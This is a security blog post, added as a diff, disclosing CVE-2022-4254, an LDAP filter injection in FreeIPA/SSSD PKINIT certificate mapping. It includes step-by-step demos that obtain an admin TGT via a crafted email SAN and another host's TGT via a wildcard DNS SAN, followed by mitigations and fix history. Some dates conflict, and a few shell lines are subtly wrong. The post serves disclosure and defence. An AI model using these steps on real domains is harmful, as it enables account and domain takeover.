@@ -1,0 +1,614 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>Fraser's IdM Blog - CVE-2022-4254: FreeIPA PKINIT certificate mapping vulnerability</title>
+        <link rel="stylesheet" type="text/css" href="../css/default.css" />
+    </head>
+    <body>
+        <div id="header">
+            <div id="logo">
+                <a href="../">Fraser's IdM Blog</a>
+            </div>
+            <div id="navigation">
+                <a href="../">Home</a>
+                <a href="../archive.html">Archive</a>
+            </div>
+        </div>
+
+        <div id="content">
+            <div class="info">
+    
+    Tags: <a title="All pages tagged 'freeipa'." href="../tags/freeipa.html">freeipa</a>, <a title="All pages tagged 'security'." href="../tags/security.html">security</a>, <a title="All pages tagged 'certificates'." href="../tags/certificates.html">certificates</a>
+    
+</div>
+
+<div id="postContent">
+    <h1 id="cve-2022-4254-freeipa-pkinit-certificate-mapping-vulnerability">CVE-2022-4254: FreeIPA PKINIT certificate mapping vulnerability</h1>
+<h2 id="executive-summary">Executive summary <a href="#executive-summary" class="section">§</a></h2>
+<p><a href="https://www.freeipa.org/">FreeIPA</a> supports the Kerberos <em>PKINIT</em> protocol extension (<a href="https://datatracker.ietf.org/doc/html/rfc4556">RFC
+4556</a>). PKINIT enables a client to authenticate to the KDC using
+an X.509 certificate and the corresonding private key, rather than a
+passphrase or keytab. FreeIPA uses <em>mapping rules</em> to map a
+certificate presented during a PKINIT authentication request to the
+corresponding principal. The mapping filter is vulnerable to LDAP
+filter injection. The search result can be influenced by values in
+the certificate, which may be attacker controlled. In the most
+extreme case, an attacker could gain control of the <code>admin</code> account,
+leading to full domain takeover.</p>
+<p>FreeIPA is <strong>not vulnerable in its default configuration</strong>. To
+exploit this bug requires:</p>
+<ul>
+<li>PKINIT is used in the environment, with certmap rules that are
+susceptible to LDAP filter injection via data from the client’s
+certificate; and</li>
+<li>A client certificate used for PKINIT includes data that result in
+the construction of an LDAP filter with a different meaning than
+the administrator intended. This is unlikely in general, but some
+use cases present a heightened risk, especially if the CA includes
+(or can be induced to include) client-supplied or
+attacker-controlled attributes in end-entity certificates.</li>
+</ul>
+<p>The issue was assigned <a href="https://access.redhat.com/security/cve/CVE-2022-4254">CVE-2022-4254</a>.</p>
+<h3 id="affected-versions">Affected versions <a href="#affected-versions" class="section">§</a></h3>
+<p>The problem is in <em>libsss_certmap</em>, which is part of <a href="https://sssd.io/">SSSD</a>.
+FreeIPA servers use this library in <code>ipa_kdb</code> Kerberos plugin
+implementation.</p>
+<p>The issue was introduced in <a href="https://sssd.io/release-notes/sssd-1.15.3.html">SSSD 1.15.3</a> (when
+<em>libsss_certmap</em> was introduced) and resolved in
+<a href="https://sssd.io/release-notes/sssd-2.3.1.html">SSSD 2.3.1</a>.</p>
+<p>All supported versions of RHEL 7 were affected (the fix was released
+on the RHEL 7.9 bugfix stream). RHEL 8.0 up to 8.3 (inclusive) were
+also affected (the fix was released to the still-supported streams).</p>
+<p>RHEL 8.4 onwards and RHEL 9 are not affected. No supported versions
+of Fedora are affected.</p>
+<h3 id="timeline">Timeline <a href="#timeline" class="section">§</a></h3>
+<ul>
+<li><strong>2017-07-25</strong>: <em>libsss_certmap</em> was released with <a href="https://sssd.io/release-notes/sssd-1.15.3.html">SSSD 1.15.3</a>.</li>
+<li><strong>2020-04-28</strong>: SSSD issue <a href="https://pagure.io/SSSD/sssd/issue/4180">pagure#4180</a> / <a href="https://github.com/SSSD/sssd/issues/5135">github#5135</a> was
+created, reporting a lack of sanitisation of filter substitutions in
+maprules.</li>
+<li><strong>2020-07-24</strong>: The sanitisation issue was fixed upstream and <a href="https://sssd.io/release-notes/sssd-2.3.1.html">SSSD
+2.3.1</a> is released, containing the fix.</li>
+<li><strong>2022-11-16</strong>: While reviewing a feature involving the use of
+PKINIT, I noticed that some versions of the <em>libsss_certmap</em> code
+did not seem to sanitise certificate data used in LDAP filters. I
+started to investigate.</li>
+<li><strong>2022-11-17</strong>: I succeed in exploiting the behaviour, and began
+internal discussions with Red Hat’s Platform Security
+engineering team.</li>
+<li><strong>2022-12-01</strong>: I sent my analysis to Red Hat’s Product Security
+team. <a href="https://access.redhat.com/security/cve/CVE-2022-4254">CVE-2022-4254</a> was reserved for this issue on the same
+day.</li>
+<li><strong>2023-01-24</strong>: Planned release of fix to RHEL 7.9 <code>sssd</code> package,
+in Batch Update 20. Details of the vulnerability were made public.</li>
+</ul>
+<h2 id="problem-description">Problem description <a href="#problem-description" class="section">§</a></h2>
+<p>FreeIPA supports <em>certificate mapping rules</em> for mapping
+certificates presented during PKINIT authentication to a Kerberos
+principal. Certmap rules are stored in the LDAP database under
+<code>cn=certmaprules,cn=certmap,{basedn}</code>. The <code>ipa_kdb</code> plugin uses
+<em>libsss_certmap</em> to process certmap rules. An example rule object:</p>
+<pre class="ldif"><code>dn: cn=certmap1,cn=certmaprules,cn=certmap,dc=ipa,dc=test
+cn: certmap1
+ipacertmapmaprule: (|(mail={subject_rfc822_name})(entryDN={subject_dn}))
+ipaenabledflag: TRUE
+objectClass: ipacertmaprule
+objectClass: top</code></pre>
+<p>The <code>ipacertmaprule</code> attribute is a string representation of an LDAP
+filter (<a href="https://datatracker.ietf.org/doc/html/rfc4515">RFC 4515</a>), with substitution templates in curly braces
+(e.g. <code>{subject_dn}</code>). Template substitution is performed by the
+<code>sss_certmap_get_search_filter</code> subroutine. The supported templates
+are described in <code>sss_certmap(5)</code>. They include:</p>
+<ul>
+<li><code>{cert!base64}</code> (base64 encoding of whole certificate)</li>
+<li><code>{issuer_dn}</code></li>
+<li><code>{subject_dn}</code></li>
+<li><code>{subject_rfc822_name}</code></li>
+<li><code>{subject_dns_name}</code></li>
+</ul>
+<p>The KDC uses the resulting filter within a bigger search filter that
+it uses to match the principal. The filter includes the requested
+principal name from the Kerberos <em>authentication service request
+(<code>AS_REQ</code>)</em>, and the maprule filter. The complete filter has the
+following structure (wrapped for readability):</p>
+<pre><code>(&amp;
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=REQUESTED_PRINCIPAL@REQUESTED_REALM)
+    (krbPrincipalName:caseIgnoreIA5Match:=REQUESTED_PRINCPAL@REQUESTED_REALM)
+  )
+  MAPRULE_FILTER_GOES_HERE
+)</code></pre>
+<p>Note that the requested principal is <strong>specified by the client</strong> in
+the Kerberos <code>AS_REQ</code>. This value <em>is properly escaped</em> where it is
+inserted in the filter. But it is important to note that the client
+can specify any principal the maprule filter fragment matches.</p>
+<h3 id="sanitisation-not-performed">Sanitisation not performed <a href="#sanitisation-not-performed" class="section">§</a></h3>
+<p>Some template substitutions are inherently safe, but some use values
+from the certificate that could contain characters with special
+meaning in LDAP filters. Of the substitutions listed above, only
+<code>{cert!base64}</code> is safe. The others could contain special
+characters (and there are still more that I did not list). Values
+that could contain special characters have to be sanitised
+(escaped). Specifically, the following characters must be replaced
+with a <em>hex escape sequence</em>:</p>
+<ul>
+<li><code>NUL</code> → <code>\00</code></li>
+<li><code>(</code> → <code>\28</code></li>
+<li><code>)</code> → <code>\29</code></li>
+<li><code>*</code> → <code>\2A</code></li>
+<li><code>\</code> → <code>\5C</code></li>
+</ul>
+<p>The affected versions of SSSD do not perform this sanitisation. As
+a consequence, the template substitutions can result in invalid
+filters (resulting in authentication failure) or filters that match
+the wrong principal entry (dangerous). The next two sections
+demonstrate two different exploit scenarios.</p>
+<div class="note">
+<p>LDAP filter injection has been assigned <a href="https://cwe.mitre.org/data/definitions/90.html">CWE-90</a> in the <em>Common
+Weakness Enumeration</em> database. Conceptually it is very similar to
+SQL injection (<a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a>).</p>
+</div>
+<h2 id="demo-1-attacker-supplied-rfc822name">Demo 1: Attacker-supplied <code>rfc822Name</code> <a href="#demo-1-attacker-supplied-rfc822name" class="section">§</a></h2>
+<p>We will issue a certificate with an attacker-supplied <code>rfc822Name</code>
+SAN value to an unprivileged user. The deployment has a plausible
+certmap rule with a structure that can be exploited to obtain a TGT
+for an attacker-specified user account, including highly privileged
+accounts such as <code>admin</code>.</p>
+<p>It is a fresh deployment running FreeIPA 4.6 on RHEL 7.9:</p>
+<pre class="shell"><code># cat /etc/redhat-release
+Red Hat Enterprise Linux Server release 7.9 (Maipo)
+
+# rpm -qa |grep ipa-
+ipa-client-4.6.8-5.el7.x86_64
+sssd-ipa-1.16.5-10.el7.x86_64
+ipa-server-4.6.8-5.el7.x86_64
+ipa-common-4.6.8-5.el7.noarch
+ipa-client-common-4.6.8-5.el7.noarch
+ipa-server-common-4.6.8-5.el7.noarch</code></pre>
+<h3 id="setup">Setup <a href="#setup" class="section">§</a></h3>
+<p>Setup steps establish the user account, certmap rules, certificate
+profiles and issuance policies required for the subsequent attack.
+I perform these steps using the <code>admin</code> account:</p>
+<pre><code># klist
+Ticket cache: KEYRING:persistent:0:0
+Default principal: admin@IPA.TEST
+
+Valid starting     Expires            Service principal
+28/11/22 23:00:19  29/11/22 23:00:07  ldap/rhel78-0.ipa.test@IPA.TEST
+28/11/22 23:00:09  29/11/22 23:00:07  krbtgt/IPA.TEST@IPA.TEST</code></pre>
+<p>Create the unprivileged user <code>alice</code>. She will be the subject
+principal to whom the certificate will be issued.</p>
+<pre class="shell"><code># ipa user-add alice --first Alice --last Able --password
+Password: XXXXXXXX
+Enter Password again to verify: XXXXXXXX
+------------------
+Added user &quot;alice&quot;
+------------------
+...</code></pre>
+<p>Add a new <code>mail</code> attribute to <code>alice</code>’s LDAP entry. This will
+enable us to issue a certificate from the internal CA that includes
+the value as an <code>rfc822Name</code> Subject Alternative Name value.</p>
+<pre class="shell"><code># echo &gt; mod.ldif &lt;&lt;EOF
+dn: uid=alice,cn=users,cn=accounts,dc=ipa,dc=test
+changetype: modify
+add: mail
+mail: &quot;bogus)(uid=admin)(cn=&quot;@ipa.test
+EOF
+
+# ldapmodify -Y GSSAPI &lt; mod.ldif
+modifying entry &quot;uid=alice,cn=users,cn=accounts,dc=ipa,dc=test&quot;</code></pre>
+<p>I had to add the new <code>mail</code> attribute via <code>ldapmodify</code> because the
+email validation performed by the IPA API does not admit all valid
+local-part values. But it is in fact a valid email address.</p>
+<div class="note">
+<p>The default access controls in FreeIPA do not allow non-admins to
+modify <code>mail</code> attributes, even in their own entry. But I use this
+approach because it is plausible for an organisation to have a
+system that allows employees to request a specific mail alias.
+Indeed we have such a system at Red Hat, although I don’t know if it
+would allow such an exotic value.</p>
+</div>
+<p>Next, add a <em>CA ACL</em> rule that permits certificate to be issued to
+user principals. For convenience we will use the included
+<code>caIPAserviceCert</code> profile. Typical real world user certificate
+scenarios would require a dedicated profile.</p>
+<pre class="shell"><code># ipa caacl-add users_caIPAserviceCert --usercat=all
+-------------------------------------
+Added CA ACL &quot;users_caIPAserviceCert&quot;
+-------------------------------------
+  ACL name: users_caIPAserviceCert
+  Enabled: TRUE
+  User category: all
+
+# ipa caacl-add-profile users_caIPAserviceCert --certprofile caIPAserviceCert
+  ACL name: users_caIPAserviceCert
+  Enabled: TRUE
+  User category: all
+  Profiles: caIPAserviceCert
+-------------------------
+Number of members added 1
+-------------------------</code></pre>
+<p>Finally add the certmap rule. It has a two-part <em>or-list</em> intended
+to match the <code>rfc822Name</code> from the certificate to the <code>mail</code>
+attribute, or else match the certificate subject DN to DN of the
+LDAP entry:</p>
+<pre class="shell"><code># ipa certmaprule-add certmap1 --maprule \
+    &quot;(|(mail={subject_rfc822_name})(entryDN={subject_dn}))&quot;
+--------------------------------------------------
+Added Certificate Identity Mapping Rule &quot;certmap1&quot;
+--------------------------------------------------
+  Rule name: certmap1
+  Mapping rule: (|(mail={subject_rfc822_name})(entryDN={subject_dn}))
+  Enabled: TRUE</code></pre>
+<div class="note">
+<p>The steps performed above are not part of the exploit itself, and
+they require administrator privileges to perform. They are
+presented as plausible configurations, the likes of which <em>may</em>
+exist (or not) in a customer’s environment.</p>
+</div>
+<h3 id="exploit">Exploit <a href="#exploit" class="section">§</a></h3>
+<p><code>alice</code> will request a certificate with the suspicious <code>rfc822Name</code>
+and <strong>acquire a TGT for the <code>admin</code> user</strong>. First obtain a TGT for
+<code>alice</code> (using password authentication):</p>
+<pre class="shell"><code>$ kinit alice
+Password for alice@IPA.TEST:</code></pre>
+<p>Create a new keypair and certificate signing request (CSR). The
+config causes the CSR to bear a SAN extension request containting
+the malicious <code>rfc822Name</code>:</p>
+<pre class="shell"><code>$ echo &gt; naughty.conf &lt;&lt;EOF
+[ req ]
+prompt = no
+encrypt_key = no
+distinguished_name = dn
+req_extensions = exts
+[ dn ]
+commonName = &quot;alice&quot;
+[ exts ]
+subjectAltName=email:\&quot;bogus)(uid=admin)(cn=\&quot;@ipa.test
+EOF
+
+$ openssl req -new -config naughty.conf \
+    -keyout naughty.key -out naughty.csr
+Generating a 2048 bit RSA private key
+..........+++
+......................+++
+writing new private key to 'naughty.key'
+-----</code></pre>
+<p>Issue the certificate (this is a <em>self-service</em> certificate request,
+which FreeIPA allows, subject to CA ACLs):</p>
+<pre class="shell"><code>$ ipa cert-request naughty.csr \
+    --principal alice naughty.csr \
+    --certificate-out naughty.pem
+  Issuing CA: ipa
+  Certificate: MIIEPjCC...
+  Subject: CN=alice,O=IPA.TEST 202211171708
+  Subject email address: &quot;bogus)(uid=admin)(cn=&quot;@ipa.test
+  Issuer: CN=Certificate Authority,O=IPA.TEST 202211171708
+  Not Before: Tue Nov 29 04:42:58 2022 UTC
+  Not After: Fri Nov 29 04:42:58 2024 UTC
+  Serial number: 13
+  Serial number (hex): 0xD</code></pre>
+<p>Finally, use the new certificate and key to obtain a TGT <strong>for
+<code>admin</code></strong>:</p>
+<pre class="shell"><code>$ kinit -X X509_user_identity=FILE:naughty.pem,naughty.key admin
+
+$ klist
+Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
+Default principal: admin@IPA.TEST
+
+Valid starting     Expires            Service principal
+28/11/22 23:47:44  29/11/22 23:47:44  krbtgt/IPA.TEST@IPA.TEST</code></pre>
+<p>The exploit succeeds because the unescaped <code>rfc822Name</code> value
+results in a filter that matches the <code>admin</code> user (formatted for
+readability):</p>
+<pre><code>(&amp;
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=alice@IPA.TEST)
+    (krbPrincipalName:caseIgnoreIA5Match:=alice@IPA.TEST)
+  )
+  (|
+    (mail=&quot;bogus)
+    (uid=admin)
+    (cn=&quot;@ipa.test)
+    (entrydn=CN=alice,O=IPA.TEST 202211171708)
+  )
+)</code></pre>
+<h2 id="demo-2-wildcard-dns-name">Demo 2: Wildcard DNS name <a href="#demo-2-wildcard-dns-name" class="section">§</a></h2>
+<p>A wildcard certificate can be used to <strong>obtain a TGT for a different
+host principal</strong>.</p>
+<h3 id="setup-1">Setup <a href="#setup-1" class="section">§</a></h3>
+<p>Add a profile for issuing wildcard certificates. I will skip the
+details and instead refer to my <a href="https://frasertweedale.github.io/blog-redhat/posts/2017-06-26-freeipa-wildcard-san.html">blog post on this topic</a>.</p>
+<p>Add a host called <code>ipa.test</code>, a <em>host group</em> called <code>webservers</code>,
+and make <code>ipa.test</code> a member of <code>webservers</code>:</p>
+<pre class="host"><code># ipa host-add ipa.test --force
+----------------------
+Added host &quot;ipa.test&quot;
+----------------------
+  Host name: ipa.test
+  Principal name: host/ipa.test@IPA.TEST
+  Principal alias: host/ipa.test@IPA.TEST
+  Password: False
+  Keytab: False
+  Managed by: ipa.test
+
+# ipa hostgroup-add webservers
+----------------------------
+Added hostgroup &quot;webservers&quot;
+----------------------------
+  Host-group: webservers
+
+# ipa hostgroup-add-member webservers --hosts ipa.test
+  Host-group: webservers
+  Member hosts: ipa.test
+-------------------------
+Number of members added 1
+-------------------------</code></pre>
+<p>Add a <em>CA ACL</em> that allows <code>webservers</code> to be issued certificates
+via the <code>wildcard</code> profile:</p>
+<pre class="shell"><code># ipa caacl-add webservers_wildcard
+----------------------------------
+Added CA ACL &quot;webservers_wildcard&quot;
+----------------------------------
+  ACL name: webservers_wildcard
+  Enabled: TRUE
+
+# ipa caacl-add-host webservers_wildcard --hostgroup webservers
+  ACL name: webservers_wildcard
+  Enabled: TRUE
+  Host Groups: webservers
+-------------------------
+Number of members added 1
+-------------------------
+
+# ipa caacl-add-profile webservers_wildcard --certprofile wildcard
+  ACL name: webservers_wildcard
+  Enabled: TRUE
+  Profiles: wildcard
+  Host Groups: webservers
+-------------------------
+Number of members added 1
+-------------------------</code></pre>
+<p>Finally, add a certmap rule that uses SAN <code>dNSName</code> values to locate
+the principal:</p>
+<pre class="shell"><code># ipa certmaprule-add certmap2 \
+    --maprule &quot;(fqdn={subject_dns_name})&quot;
+--------------------------------------------------
+Added Certificate Identity Mapping Rule &quot;certmap2&quot;
+--------------------------------------------------
+  Rule name: certmap2
+  Mapping rule: (fqdn={subject_dns_name})
+  Enabled: TRUE</code></pre>
+<h3 id="exploit-1">Exploit <a href="#exploit-1" class="section">§</a></h3>
+<p>We will issue a wildcard certificate for <code>ipa.test</code>, and use it to
+obtain a TGT for a different host. You could use <em>Certmonger</em> to
+request the certificate, but I will interact directly with FreeIPA
+via the <code>ipa</code> client program. The operator is the <code>host/ipa.test</code>
+principal (I <code>kinit</code>ed using the host keytab):</p>
+<pre class="shell"><code>$ klist
+Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
+Default principal: host/ipa.test@IPA.TEST
+
+Valid starting     Expires            Service principal
+29/11/22 03:52:59  30/11/22 03:52:59  krbtgt/IPA.TEST@IPA.TEST</code></pre>
+<p>Create a keypair and CSR:</p>
+<pre class="shell"><code>$ openssl req -new -subj '/CN=ipa.test/' -nodes \
+    -keyout server.key -out server.csr
+Generating a 2048 bit RSA private key
+........................................................+++
+.....................................................................................................................+++
+writing new private key to 'server.key'
+-----</code></pre>
+<p>Request the certificate, being sure to specify the <code>wildcard</code>
+profile:</p>
+<pre class="shell"><code>$ ipa cert-request server.csr \
+    --principal host/ipa.test \
+    --profile-id wildcard \
+    --certificate-out server.pem
+  Issuing CA: ipa
+  Certificate: MIIENTCC...
+  Subject: CN=ipa.test,O=IPA.TEST 202211171708
+  Subject DNS name: ipa.test, *.ipa.test
+  Issuer: CN=Certificate Authority,O=IPA.TEST 202211171708
+  Not Before: Tue Nov 29 09:14:09 2022 UTC
+  Not After: Fri Nov 29 09:14:09 2024 UTC
+  Serial number: 16
+  Serial number (hex): 0x10</code></pre>
+<p>Finally, use the new certificate and key to obtain a TGT for a
+<strong>different host</strong> whose <code>fqdn</code> attributes matches the LDAP
+substring filter <code>(fqdn=*.ipa.test)</code>. In this example I acquire the
+TGT for <strong><code>host/rhel78-0.ipa.test</code></strong> (one of the FreeIPA servers).</p>
+<pre class="shell"><code>$ kinit -X X509_user_identity=FILE:server.pem,server.key \
+    host/rhel78-0.ipa.test
+
+$ klist
+Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
+Default principal: host/rhel78-0.ipa.test@IPA.TEST
+
+Valid starting     Expires            Service principal
+29/11/22 04:15:52  30/11/22 04:15:52  krbtgt/IPA.TEST@IPA.TEST</code></pre>
+<p>The exploit succeeds because the unescaped wildcard <code>dNSName</code> value
+results in a <strong><em>substring match</em></strong> filter (formatted for
+readability):</p>
+<pre><code>(&amp;
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=host/rhel78-0.ipa.test@IPA.TEST)
+    (krbPrincipalName:caseIgnoreIA5Match:=host/rhel78-0.ipa.test@IPA.TEST)
+  )
+  (fqdn=*.ipa.test)
+)</code></pre>
+<p>The maprule filter matches any principal whose <code>fqdn</code> attribute ends
+in <code>.ipa.test</code>. This sub-filter could match multiple principle
+entries, but the <em>client-specified</em> principal name used in the
+<code>krbPrincipalName</code> and <code>ipaKrbPricipalAlias</code> filters select the one
+we want.</p>
+<p>If there are multiple SAN values of the relevant type, the order is
+important. The <em>last</em> value is used in the template substitution.
+In my certificate, the last value is <code>*.ipa.test</code> so the exploit
+succeeds. If the order was reversed, the exploit would not succeed.
+This is an implementation detail of SSSD; it might as well have used
+the first value but it just happened to be implemented this way.</p>
+<h2 id="discussion">Discussion <a href="#discussion" class="section">§</a></h2>
+<p>These exploits required a confluence of contributing factors to
+succeed. Deployments using PKINIT with exact certificate matching
+(the default) are also unaffected. The vulnerability only arises
+when the customer uses certmap rules. None are defined by default.
+Certmap rules (if they exist) are only <em>potentially</em> vulnerable;
+several other factors have to come together.</p>
+<p>The attacker must obtain a valid certificate from a trusted CA for a
+key they control. Except in limited cases (e.g. wildcard DNS names)
+the attacker must to be able to influence the attributes on the
+certificate. Only <em>free-form</em> string attributes are potentially
+problematic. These include DNS name, email address, SAN DN values,
+principle names, and perhaps others. And there have to be SSSD
+certmap rule template substitutions for the targeted attribute(s).</p>
+<p>Next, there had to be a certmap rule that substitutes the
+problematic value into the LDAP search filter. All filters that
+substitute free-form attributes are susceptible to exploitation.
+But in practice, <em>or-list</em> filters are <em>more susceptible</em> to
+exploitation than <em>and-list</em> or single-clause filters. This is
+because the attacker has more flexibility in how to make the filter
+match the target account. But as we saw in the wildcard <code>dNSName</code>
+example, even a single-clause filter fragment could be exploitable.</p>
+<div class="note">
+<p>The default ACIs allow any authenticated account to read certmap
+rule entries. This may aid attackers in working out the attack
+details.</p>
+</div>
+<p>Note that most <em>free-form</em> attributes have additional syntax rules
+imposed upon them. For example, a SAN <code>dNSName</code> value should look
+like a DNS name, and a SAN <code>rfc822Name</code> value should be a valid
+email address. But the raw ASN.1 data does not guarantee this.
+Even legal values can be problematic (as demonstrated). But if a
+trusted CA can be induced to issue certificates that contain
+<em>arbitrary</em> data in those free-form attributes, there is an even
+greater risk of exploitation.</p>
+<p>The use of the internal CA in this attack is incidental. The
+administrator can configure FreeIPA to trust external CAs for
+validating client PKINIT certificates. Any trusted CA can be used
+in the attack, if the attacker can cause it to issue certificates
+containing problematic values. Note that the KDC trusts the whole
+system trust store, not just the trusted CAs from the FreeIPA CA
+trust store. Certmap rules can be equipped with <em>matching rules</em> to
+restrict which issuers are allowed for PKINIT certificate matching,
+separate from CA trust for certification path verification purposes.</p>
+<h2 id="mitigations">Mitigations <a href="#mitigations" class="section">§</a></h2>
+<h3 id="use-exact-certificate-matching-do-not-use-certmap-rules">Use exact certificate matching / do not use certmap rules <a href="#use-exact-certificate-matching-do-not-use-certmap-rules" class="section">§</a></h3>
+<p>PKINIT uses exact certificate matching by default. If feasible, you
+can rely on that method and disable or delete any certmap rules.
+<code>ipa certmaprule-find</code> lists all certmap rules that have been
+defined. Use <code>ipa certmaprule-disable NAME</code> or <code>ipa certmaprule-del NAME</code> to disable or delete certmap rules, respectively.</p>
+<p>The main drawback to this approach is that each principal’s entry
+must have an up-to-date <code>userCertificate</code> attribute containing the
+user’s certificate(s). This increases the size of entries, and may
+have additional adminstrative overhead depending on how certificates
+are issued and managed.</p>
+<h3 id="audit-and-de-risk-certmap-rules">Audit and de-risk certmap rules <a href="#audit-and-de-risk-certmap-rules" class="section">§</a></h3>
+<p>Non-santised parameter substitution in an LDAP filter <em>or-list</em> is
+riskier than in <em>and-lists</em> lists or single . Replace certmap rules
+containing <em>or</em> lists with multiple, separate certmap rules.</p>
+<p>Ensure each rule is as specific as possible, and consider the
+possibility of outlier or malicious values in the certificate when
+designing certmap rules.</p>
+<h3 id="review-ca-trust-profiles-and-validation">Review CA trust, profiles and validation <a href="#review-ca-trust-profiles-and-validation" class="section">§</a></h3>
+<p>Review the kinds of data, especially user-supplied or user-writeable
+data, that can be included on certificates issued by CAs that are
+trusted for PKINIT purposes. Audit how those data are validated.</p>
+<p>Review and limit which CAs are trusted for PKINIT to only those that
+are necessary. If possible, consider using dedicated CAs for
+issuing the client certificates used for PKINIT. Use the certmap
+<em>matching rule</em> feature (not discussed here) to restrict the KDC to
+only allow certificates issued by the PKINIT CAs.</p>
+<h2 id="fix">Fix <a href="#fix" class="section">§</a></h2>
+<p>Lack of sanitisation in certmap LDAP filter construction was
+recognised as a bug in SSSD issue <a href="https://pagure.io/SSSD/sssd/issue/4180">pagure#4180</a> / <a href="https://github.com/SSSD/sssd/issues/5135">github#5135</a>.
+The framing of the issue was that legitimate values in the
+certificate were causing SSSD to construct invalid LDAP filters. It
+appears that the security implications were not recognised or
+discussed at that time.</p>
+<p>SSSD commit <a href="https://github.com/SSSD/sssd/commit/a2b9a84460429181f2a4fa7e2bb5ab49fd561274">a2b9a84460429181f2a4fa7e2bb5ab49fd561274</a>
+implemented the required sanitisation. <a href="https://sssd.io/release-notes/sssd-2.3.1.html">SSSD 2.3.1</a> was the first
+release containing the fix. Commit
+<a href="https://github.com/SSSD/sssd/commit/918fb32af6a271230bf87db47f78768edb9ca86c">918fb32af6a271230bf87db47f78768edb9ca86c</a> on
+<strong>2022-01-06</strong> backported the fix to the <code>sssd-1.16</code> branch, but
+there has not yet been a new release from this branch containing the
+fix.</p>
+<p>The SSSD team backported the fix to RHEL 7.9. It was included in
+Batch Update 20 which was released on <strong>2022-01-24</strong>. Fixes to
+extended support streams for RHEL 8.1 and 8.2 were also released on
+that day, meaning that the issue is now fixed in all supported
+versions of RHEL.</p>
+</div>
+<div id="postFooter">
+    <div id="recent">
+Recent posts:
+<ul>
+    
+        <li>
+            <a href="../posts/2023-02-02-freeipa-pkinit-certmap-vuln.html">CVE-2022-4254: FreeIPA PKINIT certificate mapping vulnerability</a>
+        </li>
+    
+        <li>
+            <a href="../posts/2023-01-22-openshift-feature-gates.html">Enabling Kubernetes feature gates in OpenShift</a>
+        </li>
+    
+        <li>
+            <a href="../posts/2022-08-29-jax-rs-header-formatting.html">Controlling header formatting in JAX-RS applications</a>
+        </li>
+    
+        <li>
+            <a href="../posts/2022-03-24-k8s-external-dns.html">Experimenting with ExternalDNS</a>
+        </li>
+    
+        <li>
+            <a href="../posts/2022-02-02-openshift-user-ns-without-anyuid.html">Running Pods in user namespaces without privileged SCCs</a>
+        </li>
+    
+</ul>
+
+<div id="recentLinks">
+    <a type="application/atom+xml" href="../atom.xml">Atom feed</a>
+     <!-- em space -->
+    <a href="../archive.html">All posts…</a>
+</div>
+
+</div>
+
+    <div id="license">
+    <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
+        <img alt="Creative Commons License" style="border-width:0" src="https://licensebuttons.net/l/by/4.0/88x31.png">
+    </a>
+    <br />
+    Except where otherwise noted, this work is licensed under a
+    <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
+        Creative Commons Attribution 4.0 International License
+    </a>.
+</div>
+
+</div>
+
+        </div>
+        <div class="clear"></div>
+        <div id="footer">
+            Generated by
+            <a href="https://jaspervdj.be/hakyll">Hakyll</a>
+        </div>
+    </body>
+</html>
